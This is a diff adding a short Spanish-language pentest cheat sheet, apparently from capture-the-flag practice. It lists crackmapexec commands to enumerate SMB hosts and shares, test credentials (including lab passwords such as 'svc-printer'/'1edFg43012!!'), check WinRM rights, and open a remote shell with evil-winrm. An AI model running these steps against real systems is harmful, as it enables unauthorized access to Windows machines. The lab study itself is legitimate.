@@ -1,0 +1,26 @@
+//SMB 445  OBTENER INFORMACION DEL TARGED
+::: crackmapexec smb ipTargetHere
+
+          SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
+
+::: crackmapexec smb ipTargedHere --shares         listar recursos compartidos a nivel de red
+
+
+
+// COMPRUEBA SI LAS CREDENCIALES SON VALIDAS EN EL SISTEMA, ifOutput [+]  credencialValida
+::: crackmapexec smb ipTargedHere -u 'tony' -p 'liltony'
+                                  -u 'svc-printer' -p '1edFg43012!!'
+
+::: crackmapexec smb iptargedHere -u 'null' -p ' ' --shares
+
+
+
+// port 5985   winrm(servicio de administraci[on remota de windows)
+
+// COMPRUEBA SI LAS CREDENCIALES ESTAN EN EL GRUPO (Remote Management Users), ifOutput '(Pwn3d!)'  credencialesReady
+
+::: crackmapexec winrm iptargedHere -u 'userHEre' -p 'passHere'     /// comprueba si el usuarioEstaOP >:)
+                        [+] .......   (Pwn3d!)
+    {      ::: gem install evil-winrm
+      ::: evil-winrm -i ipTargedHere -u 'userHere' -p 'passHere'
+    }
